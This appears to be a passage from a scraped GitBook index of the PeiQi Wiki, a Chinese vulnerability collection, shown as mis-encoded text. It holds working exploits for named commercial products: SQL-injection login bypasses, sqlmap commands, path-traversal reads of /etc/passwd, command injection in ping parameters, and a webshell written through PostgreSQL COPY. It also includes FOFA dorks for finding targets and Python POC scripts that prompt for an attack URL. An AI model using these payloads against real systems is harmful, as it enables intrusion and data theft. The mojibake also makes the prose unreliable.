application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: ASP.NET_SessionId=0upclbweiokwx4qnkpfzumir x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE4NTUyMzg5NDNkZBLjR6E85W4xvkheqS5g7gOsMdeop3Xfh1BwnTSCbV7z&__VIEWSTATEGENERATOR=E3BBEDB7&__EVENTVALIDATION=%2FwEdAATFHpXckaPEvZEyN%2BNhIQGTDFTzKcXJqLg%2BOeJ6QAEa2jPSlu16Yx4QbiDU%2BdddK1MwoKxxc3z27YmfD4jI4gVsV9%2FpN02jZyPKj4JeL7G5UVenPtL%2FK1en7XvhZG5vyHk%3D&txtUser=admin&txtPwd=123&btnSub=%E7%99%BB%E5%BD%95 å…¶ä¸­æ³¨å…¥çš„å‚æ•°ä¸º POSTæ•°æ®ä¸­çš„ txtUser å‚æ•°, ä¿å­˜ä¸ºæ–‡ä»¶ä½¿ç”¨ Sqlmapè·‘ä¸€ä¸‹ sqlmap -r sql.txt -p txtUser åŒæ—¶è¿˜å­˜åœ¨ç€ä¸‡èƒ½å¯†ç å¯ä»¥ç›´æ¥ç™»å½•åå° user: 1' or 1=1 -- pass: peiqi PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®è·µæ•™å­¦å¹³å°/æ­å·æ³•æºè½¯ä»¶ æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿ åå°XSSæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®è·µæ•™å­¦å¹³å°/æ­å·æ³•æºè½¯ä»¶ æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿ åå°XSSæ¼æ´.html","title":"æ­å·æ³•æºè½¯ä»¶ æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿ åå°XSSæ¼æ´","keywords":"","body":"æ­å·æ³•æºè½¯ä»¶ æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿ åå°XSSæ¼æ´ æ¼æ´æè¿° æ­å·æ³•æºè½¯ä»¶å¼€å‘æœ‰é™å…¬å¸å¼€å‘çš„å®è·µæ•™å­¦å¹³å°ç³»ç»Ÿä¸‹çš„æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿç™»å½•åå°ç”¨æˆ·åå¤„å­˜åœ¨é€šç”¨XSSæ¼æ´ æ¼æ´å½±å“ [!NOTE] æ­å·æ³•æºè½¯ä»¶ æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿ FOFA [!NOTE] icon_hash=\"2018105215\" || title=\"å®è·µæ•™å­¦å¹³å° - æ­å·æ³•æºè½¯ä»¶å¼€å‘æœ‰é™å…¬å¸\" æ¼æ´å¤ç° ç™»å½•åå°åæ›´æ”¹ç”¨æˆ·åï¼Œä½¿ç”¨ tdæ ‡ç­¾ é—­åˆ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®è·µæ•™å­¦å¹³å°/æ­å·æ³•æºè½¯ä»¶ å…¬è¯å®åŠ¡æ•™å­¦è½¯ä»¶ SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®è·µæ•™å­¦å¹³å°/æ­å·æ³•æºè½¯ä»¶ å…¬è¯å®åŠ¡æ•™å­¦è½¯ä»¶ SQLæ³¨å…¥æ¼æ´.html","title":"æ­å·æ³•æºè½¯ä»¶ å…¬è¯å®åŠ¡æ•™å­¦è½¯ä»¶ SQLæ³¨å…¥æ¼æ´","keywords":"","body":"æ­å·æ³•æºè½¯ä»¶ å…¬è¯å®åŠ¡æ•™å­¦è½¯ä»¶ SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° æ­å·æ³•æºè½¯ä»¶ å…¬è¯å®åŠ¡æ•™å­¦è½¯ä»¶ å­˜åœ¨SQLæ³¨å…¥æ¼æ´ æ¼æ´å½±å“ [!NOTE] æ­å·æ³•æºè½¯ä»¶ å…¬è¯å®åŠ¡æ•™å­¦è½¯ä»¶ FOFA [!NOTE] FOFAæš‚æ—¶æœªæ”¶å½•ä»»ä½•ç½‘ç«™ æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ ç™»å½•æŠ“å–è¯·æ±‚åŒ… POST /JusNotary/ HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 219 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: ASP.NET_SessionId=54zwf05sd1g4zyfpiuxxdmuc x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTE5NTI5NDc1Ng8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBZGTTkYMK0k4DlIElq0ua0zvxEhpFH8rCzVrUscEhlVc9pw%3D%3D&__VIEWSTATEGENERATOR=1B0004A3&txtName=123&txtPwd=123&btnSubmit=+ å…¶ä¸­æ³¨å…¥çš„å‚æ•°ä¸º POSTæ•°æ®ä¸­çš„ txtName å‚æ•°, ä¿å­˜ä¸ºæ–‡ä»¶ä½¿ç”¨ Sqlmapè·‘ä¸€ä¸‹ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é“¶æ¾äº‘è®¡ç®—/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é“¶æ¾äº‘è®¡ç®—/","title":"é“¶æ¾äº‘è®¡ç®—","keywords":"","body":"é“¶æ¾äº‘è®¡ç®— é“¶æ¾äº‘è®¡ç®— å¥½è§†é€šè§†é¢‘ä¼šè®®ç³»ç»Ÿ ä»»æ„æ–‡ä»¶ä¸‹è½½ CNVD-2020-62437 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-04 16:15:17 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é“¶æ¾äº‘è®¡ç®—/é“¶æ¾äº‘è®¡ç®— å¥½è§†é€šè§†é¢‘ä¼šè®®ç³»ç»Ÿ ä»»æ„æ–‡ä»¶ä¸‹è½½ CNVD-2020-62437.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é“¶æ¾äº‘è®¡ç®—/é“¶æ¾äº‘è®¡ç®— å¥½è§†é€šè§†é¢‘ä¼šè®®ç³»ç»Ÿ ä»»æ„æ–‡ä»¶ä¸‹è½½ CNVD-2020-62437.html","title":"é“¶æ¾äº‘è®¡ç®— å¥½è§†é€šè§†é¢‘ä¼šè®®ç³»ç»Ÿ ä»»æ„æ–‡ä»¶ä¸‹è½½ CNVD-2020-62437","keywords":"","body":"é“¶æ¾äº‘è®¡ç®— å¥½è§†é€šè§†é¢‘ä¼šè®®ç³»ç»Ÿ ä»»æ„æ–‡ä»¶ä¸‹è½½ æ¼æ´æè¿° é“¶æ¾äº‘è®¡ç®— å¥½è§†é€šè§†é¢‘ä¼šè®®ç³»ç»Ÿ å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ¼æ´è·å–æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] é“¶æ¾äº‘è®¡ç®— å¥½è§†é€šè§†é¢‘ä¼šè®®ç³»ç»Ÿ FOFA [!NOTE] app=\"Hanming-Video-Conferencing\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æ¼æ´Urlä¸º https://xxx.xxx.xxx.xxx/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Yinpeng_Hanming_Video_Conferencing__Arbitrary_file_read.json PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é»˜å®‰/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é»˜å®‰/","title":"é»˜å®‰","keywords":"","body":"é»˜å®‰ é»˜å®‰ å¹»é˜µèœœç½æœªæˆæƒè®¿é—® RCE PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-08 12:21:13 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é»˜å®‰/é»˜å®‰ å¹»é˜µèœœç½æœªæˆæƒè®¿é—® RCE.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é»˜å®‰/é»˜å®‰ å¹»é˜µèœœç½æœªæˆæƒè®¿é—® RCE.html","title":"é»˜å®‰ å¹»é˜µèœœç½æœªæˆæƒè®¿é—® RCE","keywords":"","body":"é»˜å®‰ å¹»é˜µèœœç½æœªæˆæƒè®¿é—® RCE æ¼æ´æè¿° é»˜å®‰ å¹»é˜µèœœç½å­˜åœ¨éƒ¨ç½²é¡µé¢æœªæˆæƒè®¿é—® ï¼Œå¯æ‰§è¡Œä»»æ„å‘½ä»¤ æ¼æ´å½±å“ [!NOTE] é»˜å®‰ å¹»é˜µèœœç½ æ¼æ´å¤ç° äº§å“é¡µé¢ å®‰è£…é¡µé¢å¦‚ä¸‹ é»˜å®‰ å¹»é˜µèœœç½ åˆ·æ–°å¹¶æŠ“åŒ… Dropæ‰ /huanzhen/have_installed? è¿›å…¥é¡µé¢ ç‚¹å‡»è°ƒè¯•æŠ“åŒ… æ‰§è¡Œå…¶ä»–å‘½ä»¤ ç‚¹å‡»ä¸€é”®è¯Šæ–­æ³„éœ² IPæ•°æ® PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ˜Ÿé”è“æµ·/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ˜Ÿé”è“æµ·/","title":"æ˜Ÿé”è“æµ·","keywords":"","body":"æ˜Ÿé”è“æµ· è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ download.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ debug.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 13:10:37 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ˜Ÿé”è“æµ·/è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ download.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ˜Ÿé”è“æµ·/è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ download.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ download.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ download.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ download.phpæ–‡ä»¶å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡ ../ éå†ç›®å½•å¯ä»¥è¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] title==\"è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å‡ºç°æ¼æ´çš„æ–‡ä»¶ä¸º download.php ï¼Œå…¶ä¸­ fileå‚æ•° å­˜åœ¨ç”¨æˆ·å¯æ§ å‘é€å¦‚ä¸‹è¯·æ±‚åŒ… GET /download.php?file=../../../../../etc/passwd HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=qkoqsiilc4dol8s4e9d7ta15g7; mylang=zh_s Connection: close Goby & POC PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ˜Ÿé”è“æµ·/è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ debug.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ˜Ÿé”è“æµ·/è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ debug.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ debug.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ debug.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ debug.php å­˜åœ¨å‘½ä»¤è°ƒè¯•é¡µé¢ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¿œç¨‹å‘½ä»¤æ‰§è¡Œ æ¼æ´å½±å“ [!NOTE] è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] title==\"è“æµ·å“è¶Šè®¡è´¹ç®¡ç†ç³»ç»Ÿ\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æ¼æ´ä»£ç  è®¿é—® debug.phpé¡µé¢ è¿œç¨‹è°ƒè¯•å‘½ä»¤æ‰§è¡Œ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®‰ç¾æ•°å­—/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®‰ç¾æ•°å­—/","title":"å®‰ç¾æ•°å­—","keywords":"","body":"å®‰ç¾æ•°å­— å®‰ç¾æ•°å­— é…’åº—å®½å¸¦è¿è¥ç³»ç»Ÿ server_ping.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-03 09:17:51 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®‰ç¾æ•°å­—/å®‰ç¾æ•°å­— é…’åº—å®½å¸¦è¿è¥ç³»ç»Ÿ server_ping.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®‰ç¾æ•°å­—/å®‰ç¾æ•°å­— é…’åº—å®½å¸¦è¿è¥ç³»ç»Ÿ server_ping.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"å®‰ç¾æ•°å­— é…’åº—å®½å¸¦è¿è¥ç³»ç»Ÿ server_ping.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"å®‰ç¾æ•°å­— é…’åº—å®½å¸¦è¿è¥ç³»ç»Ÿ server_ping.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° å®‰ç¾æ•°å­— é…’åº—å®½å¸¦è¿è¥ç³»ç»Ÿ server_ping.php å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ¼æ´æ–‡ä»¶ä¸­ipå‚æ•°æœªè¿‡æ»¤é€ æˆå‘½ä»¤æ‰§è¡Œ æ¼æ´å½±å“ [!NOTE] å®‰ç¾æ•°å­— é…’åº—å®½å¸¦è¿è¥ç³»ç»Ÿ FOFA [!NOTE] \"é…’åº—å®½å¸¦è¿è¥\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å­˜åœ¨æ¼æ´çš„æ–‡ä»¶ä¸º server_ping.php \\n\"; echo \"parent.doTestResult('$id', 'ok');\\n\"; echo \"\\n\"; } else { echo \"\\n\"; echo \"parent.doTestResult('$id', 'no');\\n\"; echo \"\\n\"; } ?> æ¼æ´ä½ç½®ä¸º $cmd = \"ping -c 2 -s 65 $ip\"; $fp = popen($cmd, \"r\"); GETä¼ å…¥ $ipå‚æ•° åç›´æ¥å‘½ä»¤æ‰§è¡Œï¼Œå¹¶ä¸”æ–‡ä»¶æ— æƒé™è¦æ±‚ è¯·æ±‚åŒ…ä¸º GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1 HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 æ¼æ´POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: å®‰ç¾æ•°å­— é…’åº—å®½å¸¦è¿è¥ç³»ç»Ÿ server_ping.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] æ­£åœ¨æ‰§è¡Œ cat /etc/passwd>../../test.txt \\033[0m\".format(target_url)) if \"parent\" in response.text and response.status_code == 200: vuln_url = target_url + \"/test.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) if \"root:\" in response.text: print(\"\\033[36m[o] æˆåŠŸæ‰§è¡Œ cat /etc/passwd, å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\") else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 20:17:08 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©æ“/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©æ“/","title":"å¤©æ“","keywords":"","body":"å¤©æ“ å¤©æ“ æ•°æ®åº“ä¿¡æ¯æ³„éœ²æ¼æ´ å¤©æ“ å‰å°SQLæ³¨å…¥ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-08 19:55:55 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©æ“/å¤©æ“ æ•°æ®åº“ä¿¡æ¯æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©æ“/å¤©æ“ æ•°æ®åº“ä¿¡æ¯æ³„éœ²æ¼æ´.html","title":"å¤©æ“ æ•°æ®åº“ä¿¡æ¯æ³„éœ²æ¼æ´","keywords":"","body":"å¤©æ“ æ•°æ®åº“ä¿¡æ¯æ³„éœ²æ¼æ´ æ¼æ´æè¿° å¤©æ“ å­˜åœ¨æœªæˆæƒè¶Šæƒè®¿é—®ï¼Œé€ æˆæ•æ„Ÿä¿¡æ¯æ³„éœ² æ¼æ´å½±å“ [!NOTE] å¤©æ“ æ¼æ´å¤ç° GET /api/dbstat/gettablessize HTTP/1.1 Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ 360_Tianqing_database_information_disclosure PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©æ“/å¤©æ“ å‰å°SQLæ³¨å…¥.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©æ“/å¤©æ“ å‰å°SQLæ³¨å…¥.html","title":"å¤©æ“ å‰å°SQLæ³¨å…¥","keywords":"","body":"å¤©æ“ å‰å°SQLæ³¨å…¥ æ¼æ´æè¿° å¤©æ“ å­˜åœ¨SQLæ³¨å…¥,æ”»å‡»è€…å¯ä»¥é€šè¿‡æ¼æ´ä¸Šä¼ æœ¨é©¬ æ¼æ´å½±å“ [!NOTE] å¤©æ“ FOFA [!NOTE] title=\"360æ–°å¤©æ“\" æ¼æ´å¤ç° æ³¨å…¥å†™shell: https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('');copy O(T) to 'C:\\Program Files (x86)\\360\\skylar6\\www\\1.php';drop table O;-- åˆ©ç”¨è¿‡ç¨‹: 1. é€šè¿‡å®‰è£…åŒ…å®‰è£…çš„ä¸€èˆ¬éƒ½æœ‰rootæƒé™ï¼Œå› æ­¤è¯¥æ³¨å…¥ç‚¹å¯å°è¯•å†™shell 2. é€šè¿‡æ³¨å…¥ç‚¹ï¼Œåˆ›å»ºä¸€å¼ è¡¨ O 3. ä¸º è¡¨O æ·»åŠ ä¸€ä¸ªæ–°å­—æ®µ T å¹¶ä¸”å†™å…¥shellå†…å®¹ 4. Postgresæ•°æ®åº“ ä½¿ç”¨COPY TOæŠŠä¸€ä¸ªè¡¨çš„æ‰€æœ‰å†…å®¹éƒ½æ‹·è´åˆ°ä¸€ä¸ªæ–‡ä»¶(å®Œæˆå†™shell) 5. åˆ é™¤ è¡¨O ä½¿ç”¨å‘½ä»¤ sqlmap -u https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ 360 TianQing ccid SQL injectable PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/äº¿é‚®/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/äº¿é‚®/","title":"äº¿é‚®","keywords":"","body":"äº¿é‚® äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-10 13:46:25 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/äº¿é‚®/äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/äº¿é‚®/äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿ å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ æ¼æ´å½±å“ [!NOTE] äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿ FOFA [!NOTE] body=\"äº¿é‚®ç”µå­é‚®ä»¶ç³»ç»Ÿ\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æ¼æ´è¯·æ±‚åŒ…å¦‚ä¸‹ POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 39 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 type='|cat /etc/passwd||' æ¼æ´POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Eyou Email SYSTEM \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/webadm/?q=moni_detail.do&action=gragh\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"type='|cat /etc/passwd||'\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ {}//webadm/?q=moni_detail.do&action=gragh \\033[0m\".format(target_url)) if \"root\" in response.text 